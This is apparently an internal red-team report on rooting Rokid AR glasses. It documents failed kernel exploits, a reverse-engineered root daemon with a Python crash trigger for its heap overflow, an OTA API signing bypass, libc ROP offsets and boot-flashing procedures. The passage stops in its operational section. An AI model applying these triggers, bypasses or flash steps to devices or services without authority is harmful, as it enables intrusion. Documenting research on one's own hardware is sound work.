# 🔴 Rokid AR Glasses — Red Team Internal Technical Report

> English: [Rokid_RedTeam_Internal_Report_EN.md](Rokid_RedTeam_Internal_Report_EN.md)

> ⚠ **歷史文件（非現況）**：本文為當時的紀錄；專案其後已有重大變化（root 已取得、引擎改執行期探測、手機 UI 重做、i18n 193 key）。
> 現行狀態請看 `README.md`、`MANIFEST.md`、`docs/deploy.md`。


**Classification: INTERNAL — RED TEAM ONLY**
**Date Range:** 2026-01-31 ~ 2026-02-11 (22 Sessions)
**Operator:** Red Team Lead
**Target:** Rokid AR Glasses RV101 (SN: <DEVICE_SERIAL>)
**Objective:** Full root privilege escalation on production Android 12 device

---

> ⚠️ **INTERNAL DOCUMENT — DO NOT DISTRIBUTE**
> Contains hardcoded credentials, exploit payloads, exact memory offsets, and operational procedures.
> For authorized red team personnel only. All testing performed on team-owned equipment.

---

## Table of Contents

1. [Executive Summary](#executive-summary)
2. [Target Device Profile](#target-device-profile)
3. [Complete Attack Surface Map](#complete-attack-surface-map)
4. [Credential & Secret Inventory](#credential--secret-inventory)
5. [Kernel Exploitation Attempts (All Failed)](#kernel-exploitation-attempts)
6. [GateServiced — Full Reverse Engineering](#gateserviced-full-reverse-engineering)
7. [OTA API — Complete Authentication Bypass](#ota-api-complete-authentication-bypass)
8. [Fastboot & EDL Analysis](#fastboot--edl-analysis)
9. [libc.so Offsets & ROP Gadget Catalog](#libcso-offsets--rop-gadget-catalog)
10. [Debuggable Applications](#debuggable-applications)
11. [Hardware Attack Surface](#hardware-attack-surface)
12. [APK Vulnerability Analysis](#apk-vulnerability-analysis)
13. [Failed Paths — Complete Registry](#failed-paths-complete-registry)
14. [Active Attack Paths — Remaining](#active-attack-paths-remaining)
15. [Tool Inventory](#tool-inventory)
16. [Operational Procedures](#operational-procedures)
17. [CVSS Security Audit](#cvss-security-audit)

---

## 1. Executive Summary

### Status: ROOT NOT YET ACHIEVED

After 22 sessions spanning 12 calendar days, the Rokid AR Glasses remain unrooted. The device implements an unusually aggressive defense-in-depth posture that has defeated all software-only privilege escalation attempts.

**What We Have:**

- ✅ Magisk-patched boot.img ready to flash (`magisk_patched-30600_9C56p.img`, 96 MB)
- ✅ Complete OTA API authentication bypass (firmware download at will)
- ✅ Full GateServiced reverse engineering (13 functions, wire protocol, all vulnerabilities)
- ✅ Complete libc.so offset table + 900+ ROP gadgets
- ✅ Complete ASLR layout from 6 crash dumps
- ✅ 5 debuggable apps with run-as access
- ✅ EDL 9008 entry method + recovery tool

**What We Need:**

- 🔴 A way to write the patched boot.img to `/dev/block/mmcblk0p17` (boot_a)

**Best Remaining Path:**

- **RPi4 Recovery `dd`** — Use Raspberry Pi 4 (Linux) → ADB in Recovery mode → sideload ZIP that executes `dd` as root

---

## 2. Target Device Profile

### Hardware

| Property | Value                                 |
| -------- | ------------------------------------- |
| Model    | Rokid RG-glasses (RV101), product=neo |
| SoC      | Qualcomm SM6375/khaje, SoC ID: 579    |
| CPU      | 4x Cortex-A55 (AArch64)               |
| GPU      | Adreno 621v1 (Chip ID: 0x6020100)     |
| Storage  | SSG EMMC                              |
| Display  | 480x640 (portrait)                    |

### Software

| Property        | Value                                                        |
| --------------- | ------------------------------------------------------------ |
| Android Version | 12 (API 32)                                                  |
| Kernel          | 5.10.209-perf-gb80a8319d11b                                  |
| Build           | `Rokid/glasses/glasses:12/SKQ1.240613.001/1.12.009-20260109` |
| Security Patch  | **2024-07-05**                                               |
| SELinux         | Enforcing                                                    |
| Bootloader      | UEFI → Unlocked (orange state, secure:no)                    |
| ADB Serial      | `<DEVICE_SERIAL>` (ADB) / `33115a5c` (fastboot)             |
| USB Config      | `sys.usb.config=adb,diag`                                    |

### Security Configuration

```properties
ro.boot.flash.locked=0
ro.boot.verifiedbootstate=orange
ro.boot.vbmeta.device_state=unlocked
ro.debuggable=0
ro.secure=1
ro.build.type=userdebug
ro.build.version.security_patch=2024-07-05
persist.sys.usb.config=adb,diag
sys.usb.config=adb,diag
```

### Kernel Security

```
kernel.kptr_restrict = 2
kernel.perf_event_paranoid = 3
kernel.unprivileged_bpf_disabled = 0    # ← NOTABLE: BPF available
vm.mmap_min_addr = 32768               # Blocks NULL deref exploitation
```

**Compile-time protections:** CFI_CLANG, SHADOW_CALL_STACK, SLAB_FREELIST_HARDENED, CONFIG_DEBUG_LIST, BTI, MTE

### Partition Layout

```
boot_a      → /dev/block/mmcblk0p17 (96 MB) ← CURRENT, TARGET FOR FLASH
boot_b      → /dev/block/mmcblk0p18
vendor_boot_a → /dev/block/mmcblk0p24
vendor_boot_b → /dev/block/mmcblk0p25
vbmeta_a    → /dev/block/mmcblk0p78
vbmeta_b    → /dev/block/mmcblk0p79
super       → /dev/block/mmcblk0p36 (dynamic partitions: system, vendor, product)
```

---

## 3. Complete Attack Surface Map

### Accessible Interfaces

| Interface     | Path                 | Access | SELinux Context | Notes                               |
| ------------- | -------------------- | ------ | --------------- | ----------------------------------- |
| KGSL GPU      | /dev/kgsl-3d0        | RW     | shell           | mode 0666, CVE-2025-21479 confirmed |
| I2C Bus       | /dev/i2c-1           | RW     | shell           | mode 0666, 4 writable devices       |
| SPI           | /dev/rt600_spidev    | RW     | shell           | mode 0666                           |
| Serial        | /dev/ttyHS0          | W      | shell           | High-speed, possible co-processor   |
| Binder        | /dev/binder          | RW     | shell           | Standard Android IPC                |
| GateServiced  | TCP 0.0.0.0:8341     | RW     | any             | Root daemon, no auth, QSEE proxy    |
| ADB           | USB                  | RW     | shell           | UID 2000                            |
| Qualcomm Diag | USB (diag interface) | ?      | ?               | Enabled in USB config, unexplored   |

### Blocked Interfaces

| Interface     | Path             | Reason                  |
| ------------- | ---------------- | ----------------------- |
| QSEECOM       | /dev/qseecom     | Permission denied       |
| DMA-BUF Heaps | /dev/dma_heap/\* | Permission denied       |
| ADSPRPC       | /dev/adsprpc-\*  | Read-only, ioctl denied |
| Block Devices | /dev/block/\*    | SELinux + UID 2000      |

### Network Services

```bash
# From adb shell
$ ss -tlnp
tcp 0.0.0.0:8341    # GateServiced (root, no auth)
```

### Writable Filesystem Paths

| Path               | Permissions     | Notes                            |
| ------------------ | --------------- | -------------------------------- |
| /mnt/vendor/qmcs/  | 777 (rwxrwxrwx) | ✅ Can write arbitrary files     |
| /data/local/tmp/   | 755             | Standard temp, writable by shell |
| /mnt/vendor/logfs/ | 755             | Log storage                      |

---

## 4. Credential & Secret Inventory

### OTA API Credentials (from device properties)

```bash
# ADB commands to extract
adb shell getprop ro.boot.key
# → <REDACTED_OTA_KEY>

adb shell getprop ro.boot.secret
# → <REDACTED_OTA_SECRET>

adb shell getprop ro.boot.devicetypeid
# → <REDACTED_OTA_DEVICETYPEID>

adb shell getprop ro.boot.deviceid
# → (device-specific, retrieve per-device)

adb shell getprop ro.boot.rokidseed
# → (different credential, NOT used for OTA auth — this was a red herring in Session 13)
```

### OTA API Signing Algorithm

```python
import hashlib, time

def generate_ota_signature(key, secret, device_type_id, device_id, service, version):
    ts = str(int(time.time() * 1000))
    sign_str = (
        f"key={key}"
        f"&device_type_id={device_type_id}"
        f"&device_id={device_id}"
        f"&service={service}"
        f"&version={version}"
        f"&time={ts}"
        f"&secret={secret}"
    )
    signature = hashlib.md5(sign_str.encode()).hexdigest()
    return signature, ts

# Usage:
sig, ts = generate_ota_signature(
    key="<REDACTED_OTA_KEY>",
    secret="<REDACTED_OTA_SECRET>",
    device_type_id="<REDACTED_OTA_DEVICETYPEID>",
    device_id="<from ro.boot.deviceid>",
    service="ota",
    version="1.12.009"
)
```

### OTA API Endpoint

```
POST https://ota.rokid.com/v1/extended/ota/check
Content-Type: application/json

{
    "key": "<REDACTED_OTA_KEY>",
    "device_type_id": "<REDACTED_OTA_DEVICETYPEID>",
    "device_id": "<device_id>",
    "service": "ota",
    "version": "1.12.009",
    "time": "<unix_ms>",
    "sign": "<md5_signature>"
}

→ Response: HTTP 200 with download URL for firmware ZIP
→ Latest: RVE01-ota-1.14.006-20260204-150203.zip (893.6 MB)
→ MD5: 0f52a85e7a25704e7a2e5cf679a32b3a
```

---

## 5. Kernel Exploitation Attempts

### Summary: ALL FAILED

| CVE / Vector        | Tool File                    | Versions | Race Attempts | BPF Sprays | Result     | Reason                        |
| ------------------- | ---------------------------- | -------- | ------------- | ---------- | ---------- | ----------------------------- |
| CVE-2024-36971      | cve*2024_36971*\*.c (13 ver) | 13       | 50,000+       | 100M+      | ❌ Blocked | Loopback DST never obsoletes  |
| Binder UAF          | binder_uaf_v5.c              | 4        | 200,000+      | 200M+      | ❌ Blocked | SLAB_FREELIST_HARDENED + CFI  |
| CVE-2024-0582       | cve*2024_0582*\*.c           | 2        | —             | —          | ❌ N/A     | PBUF_RING requires 5.19+      |
| CVE-2023-2163       | cve_2023_2163_probe.c        | 1        | —             | —          | ❌ Patched | Backported fix in 5.10.209    |
| CVE-2024-0044       | cve_2024_0044_test.c         | 1        | —             | —          | ❌ Patched | Security patch 2024-07-05     |
| CVE-2024-38401      | kgsl_syncsource_uaf.c        | 1        | —             | —          | ❌ Patched | Fixed 18+ months ago          |
| BPF verifier bypass | bpf*verifier*\*.c            | 3        | —             | —          | ❌ Patched | 5.10.209 includes fixes       |
| BPF ringbuf         | bpf*ringbuf*\*.c             | 2        | —             | —          | ❌ Blocked | Bounds checking intact        |
| KGSL UAF            | kgsl*uaf*\*.c                | 10+      | 5,000+        | —          | ❌ Blocked | GPU addr not reused           |
| TIPC                | tipc\_\*.c                   | 4        | —             | —          | ❌ N/A     | Module not loaded             |
| io_uring            | io*uring*\*.c                | 6        | —             | —          | ❌ Blocked | Features require newer kernel |
| DirtyPipe           | dirtypipe_test.c             | 1        | —             | —          | ❌ Patched | Fixed in 5.10.x               |
| nf_tables           | cve*2021_22555*\*.c          | 2        | —             | —          | ❌ Patched | Backported fix                |

### Cross-compilation command (for reference)

```bash
# NDK path
NDK="C:\Users\<USER>\AppData\Local\Android\Sdk\ndk\29.0.14206865"
CC="$NDK\toolchains\llvm\prebuilt\windows-x86_64\bin\aarch64-linux-android31-clang.exe"

# Compile
$CC -O2 -Wall -o exploit exploit.c -static

# Deploy & run
adb push exploit /data/local/tmp/
adb shell chmod +x /data/local/tmp/exploit
adb shell /data/local/tmp/exploit
```

---

## 6. GateServiced — Full Reverse Engineering

### Binary Details

```
Path:    /vendor/bin/GateServiced
Size:    20,304 bytes
Format:  ELF64 AArch64, PIE (ET_DYN)
Runtime: UID=0, GID=0, SELinux=u:r:tee:s0
Caps:    CapEff=000001ffffffffff (ALL)
Seccomp: 0 (disabled)
Port:    TCP 0.0.0.0:8341
```

### Complete Function Map

| Address         | Size  | Function              | Description                                   |
| --------------- | ----- | --------------------- | --------------------------------------------- |
| `0x2000-0x2047` | 72B   | `_start`              | ELF entry → `__libc_init`                     |
| `0x2048-0x20BF` | 120B  | `timing_helper`       | `gettimeofday()` elapsed time calc            |
| `0x20C0-0x23EF` | 816B  | `handle_client`       | Per-connection TCP handler (pthread)          |
| `0x23F0-0x243F` | 80B   | `handle_sigint`       | SIGINT → `exit(0)`                            |
| `0x2440-0x263B` | 508B  | `main`                | bind/listen/accept/pthread_create loop        |
| `0x263C-0x2807` | 460B  | `cmd_dispatch`        | LOAD/UNLOAD/EXEC router                       |
| `0x2808-0x2953` | 332B  | `get_file_size`       | fopen→fseek→ftell→fclose                      |
| `0x2954-0x2A6F` | 284B  | `read_file`           | fopen→fread_unlocked→fclose                   |
| `0x2A70-0x2E4B` | 988B  | **`run_exec_cmd_ta`** | DMA shared memory TA cmd exec, **CRASH SITE** |
| `0x2E4C-0x3353` | 1288B | `run_load_ta`         | QSEE TA loading via TZCom                     |
| `0x3354-0x346B` | 280B  | **`run_unload_ta`**   | TA unload, **ZEROES GLOBALS**                 |
| `0x346C-0x35CF` | 356B  | `dma_alloc`           | DmabufHeap alloc + mmap                       |
| `0x35D0-0x367B` | 172B  | `dma_unalloc`         | munmap + FreeDmabufHeapBufferAllocator        |

### Wire Protocol

```
REQUEST:  [cmd_id: 4B LE] [payload: 0-20476B]
RESPONSE: [data: 0-20480B]

Max frame: 20,480 bytes (0x5000)
Minimum valid: 4 bytes
< 4 bytes rejected with error log at 0x22A4
```

| cmd_id       | Command   | Handler             | Payload                             |
| ------------ | --------- | ------------------- | ----------------------------------- |
| `0x00010003` | LOAD_TA   | `run_load_ta()`     | TA path (null-terminated, max 128B) |
| `0x00010004` | UNLOAD_TA | `run_unload_ta()`   | None                                |
| Any other    | EXEC_CMD  | `run_exec_cmd_ta()` | Raw binary payload                  |

### Vulnerability 1: DMA Heap Overflow

**Trigger:** Send EXEC_CMD with payload > 20,468 bytes.

```python
import socket, struct

def trigger_overflow(host="127.0.0.1", port=8341):
    """Trigger 1-9 byte DMA heap overflow → SIGSEGV"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((host, port))

    # Load widevine TA first
    cmd_load = struct.pack('<I', 0x00010003) + b"/vendor/firmware/widevine.mbn\x00"
    sock.send(cmd_load)
    resp = sock.recv(4096)
    print(f"LOAD: {resp}")

    # Reconnect (single-command-per-connection protocol)
    sock.close()
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((host, port))

    # Overflow: 20,480 bytes total, DMA buffer is 20,468
    cmd_exec = struct.pack('<I', 0x00010001)  # Any non-LOAD/UNLOAD cmd_id
    payload = b"\x41" * 20476               # Overflow by up to 12 bytes
    sock.send(cmd_exec + payload)
    # → GateServiced will SIGSEGV (100% reproducible)

# Pre-requisite: adb forward tcp:8341 tcp:8341
trigger_overflow()
```

### Vulnerability 2: NULL Pointer Dereference (LOAD/UNLOAD Race)

**Session 22 CRITICAL CORRECTION:** This is NOT a heap UAF. It is a NULL deref on `.data+0x410` globals.

**Crash Site Disassembly (0x2DC4):**

```asm
; run_exec_cmd_ta() reads function pointer from global
0x2DB0: ADRP X8, #0x6000          ; Page of .data segment
0x2DB4: LDR  X11, [X8, #0x410]    ; X11 = *(0x6410) = global func_ptr
0x2DB8: ...                        ; Set up arguments
0x2DC4: BLR  X11                   ; CRASH! X11 = 0x0 (NULL)
```

**UNLOAD Cleanup (run_unload_ta):**

```asm
; run_unload_ta() zeroes the global function pointer
0x33XX: ADRP X8, #0x6000
0x33XX: STP  XZR, XZR, [X8, #0x410]  ; *(0x6410) = 0, *(0x6418) = 0
```

**Race Condition:**

1. Thread A: LOAD → stores func_ptr at `.data+0x410`
2. Thread B: UNLOAD → zeroes func_ptr at `.data+0x410` via `STP XZR`
3. Thread A: EXEC → reads func_ptr (now 0x0) → `BLR X11` → **SIGSEGV**

**Evidence from 6 crash dumps:**

```
Crash 1: x11=0x0000000000000000
Crash 2: x11=0x0000000000000000
Crash 3: x11=0x0000000000000000
Crash 4: x11=0x0000000000000000
Crash 5: x11=0x0000000000000000
Crash 6: x11=0x0000000000000000
```

**Why NOT exploitable:**

- `mmap_min_addr = 32768` → Cannot map page 0
- .data segment is NOT heap → Scudo spray cannot control it
- Global variables are in fixed data segment → heap reclaim strategies inapplicable
- **Session 21's entire theory (Scudo size class, heap spray, fake vtable, ROP chain) is INVALID**

### ASLR Leak from Crash Dumps

```
GateServiced base: 0x5f8f5c0000 (varies per run)
libc.so base:      0x7a4c8d5000 (varies per run)
Stack:             0x7fc07ec000 - 0x7fc080c000
DMA heap:          varies per allocation
```

**Usage:** These values are only useful if a memory corruption primitive is found. Currently no viable primitive exists.

---

## 7. OTA API — Complete Authentication Bypass

### Tool: `rokid_ota_check.py`

Full working OTA check and download script. See Section 4 for credentials and signing algorithm.

### Firmware Extraction Pipeline

```bash
# 1. Download firmware via cracked OTA API
python rokid_ota_check.py
# → Downloads RVE01-ota-1.14.006-20260204-150203.zip (893.6 MB)

# 2. Extract boot.img from OTA payload
pip install payload_dumper
payload_dumper --partitions boot --out boot_output payload.bin
# → boot_output/boot.img (96 MB = 100,663,296 bytes)

# 3. Magisk patch (on Android phone)
adb -s <PHONE_SERIAL> push boot_output/boot.img /sdcard/Download/
# Open Magisk → Install → Select and Patch a File → boot.img
adb -s <PHONE_SERIAL> pull /sdcard/Download/magisk_patched-30600_9C56p.img .

# 4. Result:
# magisk_patched-30600_9C56p.img (100,663,296 bytes) — READY TO FLASH
```

---

## 8. Fastboot & EDL Analysis

### Fastboot

**Entry:** `adb reboot recovery` → On-screen "Enter fastboot" → `fastboot devices` → `33115a5c`

**Working commands:**

```bash
fastboot getvar all
fastboot getvar max-download-size     # 805306368 (768 MB)
fastboot getvar current-slot          # a
fastboot getvar slot-count            # 2
fastboot getvar unlocked              # yes
fastboot getvar secure                # no
fastboot getvar hw-revision           # 10000
fastboot getvar variant               # SSG EMMC
fastboot reboot
fastboot reboot-recovery
```

**Blocked commands (all return "unknown command"):**

```bash
fastboot flash boot_a <image>
fastboot boot <image>
fastboot erase boot_a
fastboot oem unlock
fastboot flashing unlock
fastboot fetch boot_a
fastboot oem dump boot_a
fastboot oem readback boot_a
fastboot oem getimage:boot_a
fastboot oem sha1sum boot_a
fastboot oem reboot-edl
```

**Key finding:** `download` works (accepts data at 111 MB/s) but `write` fails with "status read failed." The bootloader separates the download/write phases and blocks only the write.

### EDL 9008

```bash
# Enter EDL
adb reboot edl
# → Device enumerates as QDLoader 9008: VID_05C6:PID_9008, COM10

# Recovery from EDL (when stuck)
python sahara_reset_v2.py
# Strategy 3 sends SAHARA_RESET → "RESET acknowledged"
# Then: Disable-PnpDevice / Enable-PnpDevice cycle in admin PowerShell
```

**EDL is NOT usable for flashing:** No firehose programmer (.mbn), no QFIL/QPST, `pip install edl` fails.

---

## 9. libc.so Offsets & ROP Gadget Catalog

### Source Binary

```
Path:    /apex/com.android.runtime/lib64/bionic/libc.so
Size:    1,322,168 bytes
Format:  ELF64 AArch64
Local:   extracted_bins/libc.so
```

### Key Function Offsets

| Function     | Offset       | Use Case                    |
| ------------ | ------------ | --------------------------- |
| `system()`   | `0x0009cbd0` | Command execution           |
| `execve()`   | `0x000da7c0` | Process replacement         |
| `mprotect()` | `0x000dade0` | Memory permission change    |
| `exit()`     | `0x000e44f4` | Clean exit                  |
| `_exit()`    | `0x000dbf00` | Immediate exit              |
| `setuid()`   | `0x000da980` | Set UID to root             |
| `setgid()`   | `0x000da960` | Set GID to root             |
| `dup2()`     | `0x0008d17c` | File descriptor duplication |

### ROP Gadget Summary (from extract_offsets.py)

| Pattern                          | Count | Description                    |
| -------------------------------- | ----- | ------------------------------ |
| `MOV Xn, Xm ; BLR Xk`            | 98    | Argument setup + indirect call |
| `LDP X29, X30, [SP], #N ; RET`   | 764   | Stack pivot / function return  |
| `STR Xn, [Xm, #off] ; ... ; RET` | 3     | Arbitrary write primitives     |
| Stack pivot gadgets              | 38    | Control SP for ROP chain       |

**Note:** These gadgets are prepared but currently unused — no memory corruption primitive exists to inject a ROP chain.

---

## 10. Debuggable Applications

### Discovery

```bash
adb shell pm list packages -3 | while read pkg; do
    pkg=${pkg#package:}
    if adb shell run-as $pkg id 2>/dev/null | grep -q uid; then
        echo "DEBUGGABLE: $pkg"
    fi
done
```

### Results

| Package                   | UID   | SELinux Context      | Data Dir                             |
| ------------------------- | ----- | -------------------- | ------------------------------------ |
| com.example.rokidglasses  | 10076 | u:r:runas_app:s0:... | /data/data/com.example.rokidglasses  |
| com.example.wifi          | 10081 | u:r:runas_app:s0:... | /data/data/com.example.wifi          |
| com.cooper.wheellog.debug | 10064 | u:r:runas_app:s0:... | /data/data/com.cooper.wheellog.debug |
| com.rokid.stream.receiver | 10080 | u:r:runas_app:s0:... | /data/data/com.rokid.stream.receiver |
| com.m365hud.glass         | 10071 | u:r:runas_app:s0:... | /data/data/com.m365hud.glass         |

### Exploitation Potential

- `run-as` gives access to each app's private data directory
- `runas_app` SELinux context — limited but may allow:
  - Reading app private files (SharedPreferences, databases)
  - Writing files that other privileged processes read
  - Potentially chaining with content provider vulnerabilities
- **CVE-2024-0044 (run-as package installer exploit) is PATCHED** — security patch 2024-07-05

---

## 11. Hardware Attack Surface

### I2C Devices (`/dev/i2c-1`, mode 0666)

| Address | Type               | Writable | Details                     |
| ------- | ------------------ | -------- | --------------------------- |
| 0x08    | PMIC (PM6125)      | ✅       | ID=0x22, power rail control |
| 0x30    | Display Controller | ✅       | 256 readable registers      |
| 0x3F    | RTC/Sensor         | ✅       | Time data, possible debug   |
| 0x64    | Battery Gauge IC   | ✅       | Reports charge level        |

### SPI (`/dev/rt600_spidev`)

- Mode: 0x03, Speed: 12 MHz, 8-bit
- All flash commands return zeroed data → device may need specific initialization sequence
- Potential: external MCU flash read/write

### Serial (`/dev/ttyHS0`)

- High-speed UART, possibly connected to RT600 co-processor
- Needs protocol identification

### Qualcomm Diag Interface

```bash
# Enabled in USB config
adb shell getprop sys.usb.config
# → adb,diag

# The diag interface appears as a second USB function
# Can potentially be used with QXDM/EFS Explorer for:
# - Reading/writing NV items
# - EFS filesystem access
# - Modem configuration
# UNEXPLORED — potential high-value path
```

---

## 12. APK Vulnerability Analysis

### TrustZoneAccessService

```
Package: com.qualcomm.qti.services.trustzoneaccess
Exported: Yes (no permission requirements)
Interface: AIDL via Mink Socket
Services exposed:
  - Device Attestation Service
  - PVC License Manager
  - Haven Token Service
```

**Risk:** Any installed APK can invoke TrustZone TAs without permission checks. Potential for:

- Attestation key extraction
- License bypass
- Token generation/theft

### RokidSysConfig

- `dump()` method has weak UID check
- Potential information disclosure

### Magisk Manager (v30.6)

```
Package: com.topjohnwu.magisk
Version: 30.6
Flags: HAS_CODE ALLOW_CLEAR_USER_DATA (NOT debuggable)
su binary: DOES NOT EXIST (/system/bin/su, /system/xbin/su — absent)
Status: Installed but non-functional — boot.img never patched
```

---

## 13. Failed Paths — Complete Registry

| #   | Attack Path                      | Sessions | Result | Why It Failed                                         |
| --- | -------------------------------- | -------- | ------ | ----------------------------------------------------- |
| 1   | `adb shell dd` (normal mode)     | 1-5      | ❌     | UID 2000, no block device access                      |
| 2   | `fastboot fetch/oem dump`        | 3-5      | ❌     | Commands not implemented                              |
| 3   | Recovery sideload (Windows)      | 15-18    | ❌     | PID D001 → WinUSB Error 10, every driver combo failed |
| 4   | `fastboot flash boot_a`          | 15-22    | ❌     | "unknown command" — write commands stripped           |
| 5   | `fastboot boot <image>`          | 15-22    | ❌     | "unknown command" — boot-from-RAM stripped            |
| 6   | `fastboot erase`                 | 22       | ❌     | "unknown command"                                     |
| 7   | `fastboot oem unlock`            | 22       | ❌     | "unknown command"                                     |
| 8   | `fastboot flashing unlock`       | 22       | ❌     | "unknown command"                                     |
| 9   | CVE-2024-36971 route cache UAF   | 3-10     | ❌     | Loopback DST never obsoletes                          |
| 10  | CVE-2024-0582 io_uring           | 5        | ❌     | PBUF_RING requires 5.19+                              |
| 11  | CVE-2023-2163 BPF verifier       | 6        | ❌     | Patched in 5.10.209                                   |
| 12  | CVE-2024-0044 run-as exploit     | 22       | ❌     | Security patch 2024-07-05                             |
| 13  | CVE-2024-38401 KGSL SyncSource   | 8        | ❌     | Patched 18+ months ago                                |
| 14  | Binder UAF (4 versions)          | 7-10     | ❌     | SLAB_FREELIST_HARDENED + CFI + SCS                    |
| 15  | KGSL UAF / OOB (10+ versions)    | 8-11     | ❌     | GPU addr not reused, per-process isolated             |
| 16  | BPF verifier bypass (3 versions) | 6-8      | ❌     | All bypass paths patched                              |
| 17  | DirtyPipe                        | 5        | ❌     | Patched in 5.10.x                                     |
| 18  | TIPC exploits                    | 7        | ❌     | Module not loaded                                     |
| 19  | io_uring exploits (6 versions)   | 6-7      | ❌     | Features require newer kernel                         |
| 20  | GateServiced UAF → Scudo spray   | 21       | ❌     | **INVALIDATED Session 22: NULL deref, not heap UAF**  |
| 21  | GateServiced fake vtable / ROP   | 21       | ❌     | **INVALIDATED Session 22: .data not heap**            |
| 22  | EDL 9008 flash                   | 22       | ❌     | No firehose programmer                                |
| 23  | Magisk su binary                 | 22       | ❌     | Not installed (boot never patched)                    |
| 24  | Block device dd (SELinux)        | 22       | ❌     | SELinux Enforcing blocks even with run-as             |
| 25  | SD card recovery install         | 15       | ❌     | Device has no SD card slot                            |
| 26  | Google USB / Zadig WinUSB        | 16-18    | ❌     | Error 10                                              |
| 27  | Zadig libusbK                    | 17       | ❌     | No device visible                                     |
| 28  | Zadig libusb-win32               | 17       | ❌     | Error 10                                              |
| 29  | usbipd-win → WSL2                | 18       | ❌     | vhci_hcd missing from WSL kernel                      |

---

## 14. Active Attack Paths — Remaining

### Path A: RPi4 Recovery `dd` (HIGHEST PRIORITY) ⭐

```bash
# On Raspberry Pi 4 (Linux):
sudo apt update && sudo apt install -y adb
echo 'SUBSYSTEM=="usb", ATTR{idVendor}=="18d1", MODE="0666", GROUP="plugdev"' | \
  sudo tee /etc/udev/rules.d/51-android.rules
sudo udevadm control --reload-rules

# Transfer patched boot + flash ZIP from Windows
scp magisk_patched-30600_9C56p.img pi@<RPI>:~/
scp rokid_boot_flash.zip pi@<RPI>:~/

# On Windows: enter Recovery
adb reboot recovery
# Disconnect USB, connect to RPi4
# On glasses: "Apply update from ADB"

# On RPi4:
adb devices    # Should show sideload device
adb sideload ~/rokid_boot_flash.zip

# After flash:
adb reboot
adb shell su    # Should now work!
```

**Flash ZIP contents (rokid_boot_flash.zip):**

```
META-INF/com/google/android/update-binary   # Shell script
META-INF/com/google/android/updater-script  # (empty)
boot.img                                     # magisk_patched-30600_9C56p.img
```

**update-binary script:**

```bash
#!/sbin/sh
# Extract boot.img and dd to boot_a
dd if=/tmp/boot.img of=/dev/block/by-name/boot_a bs=4096
echo "Boot partition flashed successfully"
```

### Path B: Recovery Shell Direct `dd`

```bash
# Enter recovery
adb reboot recovery
# Wait for recovery...
adb shell    # Recovery shell may run as root!

# If root:
adb push magisk_patched-30600_9C56p.img /tmp/
adb shell dd if=/tmp/magisk_patched-30600_9C56p.img of=/dev/block/by-name/boot_a bs=4096
adb reboot
```

### Path C: Qualcomm Diag Interface

```bash
# The diag USB function is enabled (sys.usb.config=adb,diag)
# On Windows: look for Qualcomm HS-USB Diagnostics in Device Manager
# Tools: QXDM, EFS Explorer, or diag-tools on Linux

# Potential capabilities:
# - NV item read/write (some NV items control security settings)
# - EFS filesystem access
# - Raw partition read/write (some Qualcomm diag variants support this)
```

### Path D: Debuggable App Chain

```bash
# Explore what runas_app context can access
adb shell run-as com.example.rokidglasses

# Check accessible files, content providers, etc.
ls -la /data/data/com.example.rokidglasses/
# Look for:
# - Shared preferences with secrets
# - SQLite databases with auth tokens
# - Native libs with vulnerabilities
# - Content providers accessible from privileged context
```

---

## 15. Tool Inventory

### Custom Tools (in workspace)

| File                         | Language | Purpose                                               |
| ---------------------------- | -------- | ----------------------------------------------------- |
| `rokid_ota_check.py`         | Python   | OTA API auth bypass + firmware download               |
| `rokid_ota_auth.py`          | Python   | OTA authentication library                            |
| `extract_offsets.py`         | Python   | libc.so disassembly + ROP gadget search               |
| `sahara_reset.py`            | Python   | EDL recovery tool v1                                  |
| `sahara_reset_v2.py`         | Python   | EDL recovery tool v2 (4 strategies)                   |
| `gate_protocol_test.py`      | Python   | GateServiced protocol interaction                     |
| `gate_protocol_test_v2.py`   | Python   | GateServiced enhanced protocol test                   |
| `gate_fuzzer_v3.py`          | Python   | GateServiced payload fuzzer                           |
| `gate_diagnostic.py`         | Python   | GateServiced diagnostic info extraction               |
| `gate_analyzer.py`           | Python   | GateServiced binary analysis                          |
| `gate_dma_overflow.py`       | Python   | DMA overflow PoC trigger                              |
| `gate_uaf_race.py`           | Python   | LOAD/UNLOAD race condition trigger                    |
| `gate_exec_breakthrough.py`  | Python   | EXEC command experimentation                          |
| `gate_widevine_exploit.py`   | Python   | Widevine TA exploitation attempt                      |
| `frida_gateservice_hook.js`  | JS       | Frida hooks for libc read/write/ioctl in GateServiced |
| `frida_hook_gate.py`         | Python   | Frida script launcher for GateServiced                |
| `disasm_exec_cmd.py`         | Python   | run_exec_cmd_ta disassembly analysis                  |
| `disasm_full.py`             | Python   | Full GateServiced disassembly                         |
| `extract_exec_ta.py`         | Python   | TA execution flow extraction                          |
| `analyze_gate.py` (1/2/3)    | Python   | GateServiced analysis iterations                      |
| `create_zip.py`              | Python   | Flashable ZIP creator                                 |
| `create_flash_zip.py`        | Python   | Boot flash ZIP creator                                |
| `download_script.py`         | Python   | Firmware download utility                             |
| `rokid_fastboot.inf`         | INF      | Custom fastboot USB driver                            |
| `comprehensive_vuln_scan.sh` | Shell    | Full vulnerability scanner                            |
| `test_suite.sh`              | Shell    | Exploit test suite runner                             |
| `run_v11.ps1`                | PS1      | PowerShell exploit runner                             |

### C Exploit/Probe Files (60+)

See workspace listing for full inventory. Key categories:

- `binder_uaf_v*.c` — Binder UAF exploits
- `bpf_*.c` — BPF verifier/heap spray tools
- `kgsl_*.c` — GPU driver exploits (10+ versions)
- `cve_*` — CVE-specific probes and exploits
- `gateserviced_fuzzer.c` — Native GateServiced fuzzer
- `io_uring_*.c` — io_uring probes
- `tipc_*.c` — TIPC network exploits
- `i2c_*.c` — I2C hardware probes

### Key Artifacts

| File                             | Size     | Description                          |
| -------------------------------- | -------- | ------------------------------------ |
| `magisk_patched-30600_9C56p.img` | 96 MB    | Ready-to-flash Magisk boot image     |
| `extracted_bins/libc.so`         | 1.29 MB  | Device libc.so with all offsets      |
| `GateServiced.bin`               | 20.3 KB  | Extracted GateServiced binary        |
| `rokid_boot_flash.zip`           | ~96 MB   | Flashable ZIP for recovery sideload  |
| `RVE01-ota-1.14.006-*.zip`       | 893.6 MB | Full OTA firmware package            |
| `payload.bin`                    | ~900 MB  | OTA payload for partition extraction |
| `rokid_fastboot.inf`             | —        | Custom fastboot INF driver file      |

---

## 16. Operational Procedures

### ADB Connection

```bash
adb devices
# → <DEVICE_SERIAL>    device

adb shell id
